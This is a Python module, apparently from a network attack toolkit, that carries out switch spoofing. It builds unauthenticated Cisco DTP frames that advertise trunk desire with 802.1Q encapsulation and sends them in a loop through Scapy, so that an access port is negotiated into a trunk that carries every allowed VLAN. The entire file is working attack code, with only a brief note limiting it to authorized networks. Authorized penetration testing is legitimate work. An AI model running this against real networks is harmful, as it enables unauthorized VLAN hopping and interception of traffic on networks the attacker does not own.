"""Switch spoofing (DTP spoofing): negotiate a trunk from an access port.

Cisco switches use the Dynamic Trunking Protocol (DTP) to agree whether a port
becomes a trunk. DTP frames are sent to a multicast address and are not
authenticated. A port in a dynamic mode that accepts the negotiation can become a
trunk, and a trunk carries the tagged traffic of every allowed VLAN. This module
sends the DTP frames that advertise trunk capability.

The field layout follows the public DTP description. Whether a given switch forms
a trunk depends on its own DTP configuration, so verify the behavior on that
switch before relying on the result.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import struct
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, Raw, sendp
from scapy.packet import Packet

from macabre.attacks.common import Runner, normalize_unicast_mac, read_interface_mac, run_command

DTP_MAC = "01:00:0c:cc:cc:cc"
SNAP_HEADER = bytes.fromhex("aaaa03") + bytes.fromhex("00000c") + bytes.fromhex("2004")
DTP_VERSION = 0x01
TLV_DOMAIN = 0x0001
TLV_STATUS = 0x0002
TLV_TYPE = 0x0003
TLV_NEIGHBOR = 0x0004
STATUS_TRUNK_DESIRABLE = 0x03   # trunk on, willing to negotiate
TYPE_DOT1Q = 0xA5               # 802.1Q encapsulation


@dataclass(frozen=True)
class SwitchSpoofingConfig:
    iface: str                  # attacker interface, on the access port
    domain: str = ""           # VTP domain name carried in the frame (optional, max 32 bytes)
    count: int = 0              # DTP frames to send; 0 = run until stopped
    interval: float = 1.0       # seconds between frames
    dry_run: bool = False       # build frames but do not send them

    def __post_init__(self) -> None:
        if len(self.domain.encode()) > 32:
            raise ValueError("The VTP domain name can have at most 32 bytes.")


@dataclass
class SwitchSpoofingStats:
    sender_mac: str = ""
    frames: int = 0
    status: str = ""


def _tlv(tlv_type: int, value: bytes) -> bytes:
    return struct.pack("!HH", tlv_type, 4 + len(value)) + value


def dtp_payload(sender_mac: str, domain: str = "") -> bytes:
    """LLC/SNAP header and DTP body advertising trunk capability for `sender_mac`."""
    mac = normalize_unicast_mac(sender_mac)
    body = bytes([DTP_VERSION])
    body += _tlv(TLV_DOMAIN, domain.encode())
    body += _tlv(TLV_STATUS, bytes([STATUS_TRUNK_DESIRABLE]))
    body += _tlv(TLV_TYPE, bytes([TYPE_DOT1Q]))
    body += _tlv(TLV_NEIGHBOR, bytes.fromhex(mac.replace(":", "")))
    return SNAP_HEADER + body


def build_dtp_frame(sender_mac: str, domain: str = "") -> Packet:
    """DTP frame from `sender_mac` to the DTP multicast address, with an 802.3 length field."""
    payload = dtp_payload(sender_mac, domain)
    return Ether(src=normalize_unicast_mac(sender_mac), dst=DTP_MAC, type=len(payload)) / Raw(payload)


def run_switch_spoofing(
    config: SwitchSpoofingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[SwitchSpoofingStats], None],
    run: Runner | None = None,
    send: Callable[..., Any] | None = None,
) -> SwitchSpoofingStats:
    """Send DTP trunk advertisements until `count` or `stop_event`."""
    run = run or run_command
    send = send or sendp

    if config.dry_run:
        stats = SwitchSpoofingStats(
            status=f"Dry run: would send DTP trunk advertisements to {DTP_MAC}. Nothing sent.",
        )
        on_progress(replace(stats))
        return stats

    sender_mac = read_interface_mac(config.iface, run)
    stats = SwitchSpoofingStats(sender_mac=sender_mac)
    while not stop_event.is_set() and (config.count == 0 or stats.frames < config.count):
        send(build_dtp_frame(sender_mac, config.domain), iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
        stop_event.wait(config.interval)
    return stats
